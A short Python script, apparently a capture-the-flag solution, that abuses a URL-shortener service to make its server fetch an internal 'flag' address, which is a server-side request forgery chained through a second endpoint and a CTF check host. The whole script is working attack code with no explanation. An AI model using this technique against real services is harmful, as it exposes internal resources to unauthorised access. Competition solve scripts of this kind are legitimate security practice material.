#!/usr/bin/env python3
import httpx
from urllib.parse import urlparse


def main():
    with httpx.Client(follow_redirects=True) as client:
        response = client.get("http://34.146.112.223:32654/shorten?format=json&url=http://flag:45654/flag")

    url = urlparse(response.json()["shorturl"])
    print(url.path)
    with httpx.Client(follow_redirects=True) as client:
        response = client.get("http://34.146.112.223:32654/shortenm?format=json&url=http://check.ctf.iwashiira.com:8000"+url.path)
    print(response.text) 

main()
